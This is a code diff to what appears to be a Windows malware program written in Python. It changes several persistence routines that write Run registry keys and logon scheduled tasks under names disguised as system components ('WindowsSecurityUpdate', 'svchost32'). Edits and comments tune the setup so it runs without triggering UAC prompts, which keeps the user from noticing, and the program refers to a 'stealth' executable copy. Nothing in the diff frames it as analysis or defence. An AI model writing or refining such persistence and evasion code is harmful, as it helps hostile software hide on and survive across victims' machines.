@@ -1924,16 +1924,20 @@ def registry_run_key_persistence():
     try:
         import winreg
         
-        current_exe = os.path.abspath(__file__)
-        if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+        # Get the executable path - no quotes needed for registry
+        if hasattr(sys, 'frozen') and sys.frozen:
+            current_exe = sys.executable
+        else:
+            current_exe = os.path.abspath(__file__)
+            if current_exe.endswith('.py'):
+                current_exe = f'python.exe "{current_exe}"'
         
         log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
         
         # Multiple registry locations for persistence
+        # IMPORTANT: Using HKEY_CURRENT_USER (not HKLM) to avoid UAC prompts
         run_keys = [
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
         ]
         
         value_name = "WindowsSecurityUpdate"
@@ -1946,6 +1950,7 @@ def registry_run_key_persistence():
                 log_message(f"[REGISTRY] Key created successfully: {key_path}")
                 
                 log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
+                # Store without extra quotes - registry Run keys handle this correctly
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                 log_message(f"[REGISTRY] Value set successfully in {key_path}")
                 
@@ -2013,9 +2018,10 @@ def scheduled_task_persistence():
             current_exe = f'python.exe "{current_exe}"'
         
         # Create scheduled task using schtasks command
+        # Use /RL LIMITED to run with normal user privileges (no UAC prompt)
         subprocess.run([
             'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
-            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
+            '/TR', current_exe, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
         ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
         
         return True
@@ -3315,13 +3321,14 @@ def setup_scheduled_task_persistence():
         
         task_name = "WindowsSecurityUpdateTask"
         
-        # Create scheduled task
+        # Create scheduled task with /rl limited to avoid UAC prompts
+        # Changed from 'highest' to 'limited' so it runs with normal user privileges
         subprocess.run([
             'schtasks.exe', '/create',
             '/tn', task_name,
             '/tr', current_exe,
             '/sc', 'onlogon',
-            '/rl', 'highest',
+            '/rl', 'limited',
             '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
@@ -9394,9 +9401,12 @@ def add_registry_startup():
             log_message(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
         
         # Add to registry pointing to the stealth location
+        # IMPORTANT: Do NOT use quotes around the path in registry - it can cause UAC prompts
+        # The executable will run with normal user privileges automatically
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')
+        # Store without quotes to avoid UAC prompt on startup
+        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, stealth_exe_path)
         winreg.CloseKey(key)
         
         log_message(f"[OK] Registry persistence established: {stealth_exe_path}")
